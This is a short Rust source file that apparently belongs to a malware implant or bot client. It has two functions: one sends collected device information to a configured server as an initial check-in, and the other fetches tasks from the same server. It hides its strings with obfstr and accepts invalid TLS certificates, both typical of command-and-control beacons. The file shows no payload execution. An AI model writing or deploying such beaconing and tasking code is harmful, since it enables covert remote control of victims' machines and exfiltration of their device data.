use crate::{_DOMAIN, info::DeviceInfo};
use obfstr::obfstr as s;

pub fn initial_contact(data: &DeviceInfo) -> bool {
    let client = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let res = client.post(format!("{}{}", _DOMAIN.clone(), s!("/index.php?api=init")))
        .json(data)
        .send().unwrap();
    let s = res.status();
    if s.is_success() {
        let body = res.text().unwrap_or_default();
        if body.trim() == s!("OK") {
            return true;
        }
    }

    return false;
}

pub fn fetch_tasks(data: &DeviceInfo) -> String {
    let client = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let res = client.post(format!("{}{}", _DOMAIN.clone(), s!("/index.php?api=task")))
        .json(data)
        .send().unwrap();
    let s = res.status();
    if s.is_success() {
        return res.text().unwrap_or_default();
    }

    return String::from("");
}